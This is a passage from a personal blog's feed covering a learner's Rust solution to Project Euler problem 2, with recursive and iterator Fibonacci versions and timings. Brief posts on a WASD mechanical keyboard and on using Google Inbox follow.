        &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fib&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fib&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;As I am still learning Rust, I am not sure if there's more Rustacean way of doing it.
I couldn't find anything relevant to this in the docs, so for now I will leave it
as it is until I get some feedback on it. I wonder if a closure would be better?&lt;/p&gt;
&lt;p&gt;EDIT: From the comments below (thanks pf), this is a much more Rust like implementation IMO:&lt;/p&gt;
&lt;pre class="code rust literal-block"&gt;
&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fib&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="k"&gt;match&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fib&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fib&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Now I need to get a list of numbers while the return of the &lt;code&gt;fib&lt;/code&gt; function
is &amp;lt; 4,000,000. I cheated a bit here, as I figured out that the max number
to pass to the function in this case is 34.
I would assume that in the &lt;em&gt;more correct&lt;/em&gt; way of doing it, the limit is
defined in a better way.&lt;/p&gt;
&lt;pre class="code rust literal-block"&gt;
&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;vals&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fib&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Thinking back to the previous example I already know about filter and sum.&lt;/p&gt;
&lt;pre class="code rust literal-block"&gt;
&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;vals&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fib&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;
                &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
                &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;But there's a problem:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;   Compiling euler_2 v0.0.1 (file:////work/sandbox/euler_rust/euler_2)
/work/sandbox/euler_rust/euler_2/src/main.rs:16:10: 16:15 error: type `core::iter::Filter&amp;lt;i32, core::iter::Map&amp;lt;i32, i32, core::ops::Range&amp;lt;i32&amp;gt;, closure[/work/sandbox/euler_rust/euler_2/src/main.rs:14:32: 14:42]&amp;gt;, closure[/work/sandbox/euler_rust/euler_2/src/main.rs:15:17: 15:31]&amp;gt;` does not implement any method in scope named `sum`
/work/sandbox/euler_rust/euler_2/src/main.rs:16         .sum();
                                                        ^~~~~
error: aborting due to previous error
Could not compile `euler_2`.&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Seems like &lt;code&gt;sum&lt;/code&gt; won't work here due to the &lt;code&gt;map&lt;/code&gt;. Not to worry, I used &lt;code&gt;fold&lt;/code&gt; in the previous example,
before the helpful folks at &lt;a class="reference external" href="http://reddit.com/r/rust"&gt;the rust subreddit&lt;/a&gt; told me about &lt;cite&gt;sum&lt;/cite&gt;,
so let's use that instead, as that should work.&lt;/p&gt;
&lt;pre class="code rust literal-block"&gt;
&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;vals&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fib&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;
                &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
                &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fold&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;

   &lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;vals&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;EDIT: &lt;code&gt;sum&lt;/code&gt; does work, I just forgot to add &lt;code&gt;use std::iter::AdditiveIterator;&lt;/code&gt; at the
top of the file. The Github file contains this fix.&lt;/p&gt;
&lt;p&gt;Let's run it:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;cargo run
     Running `target/euler_2`
4613732&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The result checks out, so Project Euler 2 has been solved.&lt;/p&gt;
&lt;p&gt;What I would like to know though: Is there a better way to generate the
fibonacci sequence? If you have suggestions (or about anything else on this page),
please leave me a message below. After all, this is a learning exercise for me
and for anyone else interested.&lt;/p&gt;
&lt;p&gt;EDIT: With some marvellous feedback (which is a great benefit of posting
these) I have edited the code on Github to use an iterator instead of the recursive call.&lt;/p&gt;
&lt;p&gt;The code is now (main credit to /u/emk and others):&lt;/p&gt;
&lt;pre class="code rust literal-block"&gt;
&lt;span class="kn"&gt;use&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;iter&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;AdditiveIterator&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;

&lt;/span&gt;&lt;span class="cp"&gt;#[derive(Copy)]&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="k"&gt;pub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;FibonacciSequence&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;n_minus_1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;u32&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;n_minus_2&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;u32&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;

&lt;/span&gt;&lt;span class="k"&gt;impl&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;Iterator&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;FibonacciSequence&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="k"&gt;type&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Item&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;u32&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="k"&gt;mut&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;Option&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;u32&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;mut&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;n_minus_1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;n_minus_2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;

        &lt;/span&gt;&lt;span class="c1"&gt;// Special case: If all our fields are zero, we want to generate
&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="c1"&gt;// our initial 1.  Everything else will work correctly from here.
&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;

        &lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;n_minus_2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;n_minus_1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;n_minus_1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="nb"&gt;Some&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;

&lt;/span&gt;&lt;span class="k"&gt;pub&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fibonacci_sequence&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;FibonacciSequence&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;FibonacciSequence&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;n_minus_1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;n_minus_2&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;

&lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sum&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fibonacci_sequence&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;take_while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4000000&lt;/span&gt;&lt;span class="k"&gt;u32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;

    &lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Result: {}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The interesting thing is the performance difference between the iterator
implementation and the recursive call. The recursive implementation timings
are:&lt;/p&gt;
&lt;blockquote&gt;
real        0m0.311s
user        0m0.255s
sys 0m0.035s&lt;/blockquote&gt;
&lt;p&gt;Versus the timings of the iterator:&lt;/p&gt;
&lt;blockquote&gt;
real        0m0.079s
user        0m0.025s
sys 0m0.035s&lt;/blockquote&gt;
&lt;p&gt;Clearly a vast improvement there at the cost of a little extra code.
With the iterator the benefit stems from the fact that we track where we
are in the sequence. So for each number we don't need to recursively
call the &lt;code&gt;fib&lt;/code&gt; function until n is 1, which is where the big saving comes from.&lt;/p&gt;
&lt;p&gt;This and all future solutions are on &lt;a class="reference external" href="https://github.com/Svenito/euler_rust"&gt;my Github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Also posted to &lt;a class="reference external" href="https://www.reddit.com/r/rust/comments/2t23ow/still_learning_rust_following_on_with_a_write_up/"&gt;/r/rust&lt;/a&gt;&lt;/p&gt;
</summary></entry><entry><title>WASD V2</title><link href="http://unlogic.co.uk/2015/01/15/wasd-v2/" rel="alternate"></link><updated>2015-01-15T15:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-01-15:2015/01/15/wasd-v2/</id><summary type="html">&lt;p&gt;It arrived! I am now the proud owner of a WASD V2 mechanical keyboard. I ordered
it with brown MX switches, large centered font and light grey alphanumeric caps
and grey modifiers. I went of the 87 key version (no keypad) and also threw in a
wrist rest to go with it.&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/SzmT9zJ.jpg?2"&gt;&lt;img alt="" src="http://i.imgur.com/SzmT9zJ.jpg?2" style="width: 500px;" /&gt;&lt;/a&gt;
&lt;p&gt;Yes, this isn't the most stylish photo, plus there's no shoe in it either.&lt;/p&gt;
&lt;p&gt;This is my first mechanical keyboard so I can't really compare it to anything.
That said, I very much love the feel of the keyboard and really enjoy typing on it.
It's solidly built and the keys are very well printed. Although I would
still like some &lt;a class="reference external" href="https://c1.staticflickr.com/7/6024/5886540547_abdb8c837f_z.jpg"&gt;dolch keycaps&lt;/a&gt;
at some point in the future.&lt;/p&gt;
&lt;p&gt;So thanks to WASD for shipping (2 weeks to the UK from point of ordering) such a
lovely keyboard to me. If you are after your own mechanical keyboard, you can't
go wrong with a WASD. I'm even tempted to get a CODE in the future maybe.&lt;/p&gt;
</summary><category term="[]"></category></entry><entry><title>Checking in follow up</title><link href="http://unlogic.co.uk/2015/01/12/checking-in-follow-up/" rel="alternate"></link><updated>2015-01-12T09:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-01-12:2015/01/12/checking-in-follow-up/</id><summary type="html">&lt;p&gt;In a &lt;a class="reference external" href="http://unlogic.co.uk/2014/10/29/checking-in/"&gt;previous post&lt;/a&gt; I wrote about how I use
my inbox as a TODO list. Since then I have received my Google Inbox invite and have now
been using Inbox exclusively to manage my email.&lt;/p&gt;
&lt;p&gt;It works pretty much as I expected, which is great. The added bonus of its &amp;quot;Bundles&amp;quot; is
a nice touch, and it's pretty smart about putting email into those bundles. I'm using
it pretty much as I did my old inbox, but it's more tailored to my way of working, allowing
me to swipe the mail to archive, and optionally delete it, pin it, or file it into a different
bundle. Once a mail is in a bundle they get grouped together and appear in a single &amp;quot;block&amp;quot;, making
your inbox less cluttered.&lt;/p&gt;
&lt;p&gt;I have a few invites left for those who are interested, but by now I imagine anyone who wants
and invite, will have had one.&lt;/p&gt;
